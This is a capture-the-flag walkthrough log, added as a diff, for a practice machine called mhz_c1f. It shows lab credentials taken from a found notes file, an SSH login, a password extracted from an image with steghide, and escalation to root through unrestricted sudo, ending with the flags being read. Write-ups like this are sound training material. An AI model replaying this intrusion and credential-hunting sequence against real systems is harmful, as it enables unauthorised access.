@@ -1,0 +1,117 @@
+Dirbusting and found notes.txt
+
+Inside found credential:
+first_stage:flagitifyoucan1234
+hack@kali:~/CTF/mhz_c1f$ ssh first_stage@192.168.1.7
+The authenticity of host '192.168.1.7 (192.168.1.7)' can't be established.
+ECDSA key fingerprint is SHA256:S57oMrpvpMW8QfG3cTkWrjN2R9Zn3x8EZnJCfEfuF2k.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.1.7' (ECDSA) to the list of known hosts.
+first_stage@192.168.1.7's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ System information disabled due to load higher than 1.0
+
+ * MicroK8s passes 9 million downloads. Thank you to all our contributors!
+
+     https://microk8s.io/
+
+65 packages can be updated.
+26 updates are security updates.
+
+
+Last login: Fri Apr 24 18:18:07 2020 from 192.168.5.253
+$ 
+$ 
+$ 
+
+
+$ id
+uid=1001(first_stage) gid=1001(first_stage) groups=1001(first_stage)
+$ 
+$ 
+$ ls
+user.txt
+$ cat user.txt
+HEEEEEY , you did it 
+that's amazing , good job man
+
+so just keep it up and get the root bcz i hate low privileges ;)
+
+#mhz_cyber
+
+
+hack@kali:~/CTF/mhz_c1f$ steghide --extract -sf spinningthewool.jpeg
+Enter passphrase: 
+wrote extracted data to "remb2.txt".
+hack@kali:~/CTF/mhz_c1f$ 
+hack@kali:~/CTF/mhz_c1f$ ll
+totale 2224
+-rw-r--r-- 1 hack hack      0 mag 24 12:05 19th
+-rw-r--r-- 1 hack hack 447755 mag 24 12:06 19th_century_American.jpeg
+-rw-r--r-- 1 hack hack 356338 mag 24 12:07 FrankMcCarthy.jpeg
+-rw-r--r-- 1 hack hack   1224 mag 24 11:59 my_notes.txt
+-rw-r--r-- 1 hack hack     86 mag 24 11:58 notes.txt
+-rw-r--r-- 1 hack hack     85 mag 24 12:12 remb2.txt
+-rw-r--r-- 1 hack hack     31 apr 24 18:10 remb.txt
+-rw-r--r-- 1 hack hack 519616 mag 24 12:08 Russinabeauty.jpeg
+-rw-r--r-- 1 hack hack    919 mag 24 11:49 scan.txt
+-rw-r--r-- 1 hack hack 926849 mag 24 12:10 spinningthewool.jpeg
+hack@kali:~/CTF/mhz_c1f$ cat remb2.txt 
+ooh , i know should delete this , but i cant' remember it 
+screw me 
+
+mhz_c1f:1@ec1f
+
+
+
+$ su - mhz_c1f
+Password: 
+mhz_c1f@mhz_c1f:~$ 
+mhz_c1f@mhz_c1f:~$ 
+mhz_c1f@mhz_c1f:~$ 
+mhz_c1f@mhz_c1f:~$ 
+mhz_c1f@mhz_c1f:~$ id
+uid=1000(mhz_c1f) gid=1000(mhz_c1f) groups=1000(mhz_c1f),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+mhz_c1f@mhz_c1f:~$ 
+
+
+
+mhz_c1f@mhz_c1f:~$ sudo -l
+[sudo] password for mhz_c1f: 
+Matching Defaults entries for mhz_c1f on mhz_c1f:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mhz_c1f may run the following commands on mhz_c1f:
+    (ALL : ALL) ALL
+mhz_c1f@mhz_c1f:~$ 
+mhz_c1f@mhz_c1f:~$ 
+mhz_c1f@mhz_c1f:~$ 
+mhz_c1f@mhz_c1f:~$ sudo su -
+root@mhz_c1f:~#  cd /root/
+root@mhz_c1f:~# ls -la
+total 32
+drwx------  3 root root 4096 Apr 24 18:07 .
+drwxr-xr-x 24 root root 4096 May 24 10:01 ..
+-rw-------  1 root root   54 Apr 24 18:07 .bash_history
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root  124 Apr 24 18:07 .root.txt
+drwx------  2 root root 4096 Apr 13 17:14 .ssh
+-rw-------  1 root root  833 Apr 24 18:07 .viminfo
+root@mhz_c1f:~# cat .root.txt 
+OwO HACKER MAN :D
+
+Well done sir , you have successfully got the root flag.
+I hope you enjoyed in this mission.
+
+#mhz_cyber
+root@mhz_c1f:~# 
+
+
+
+
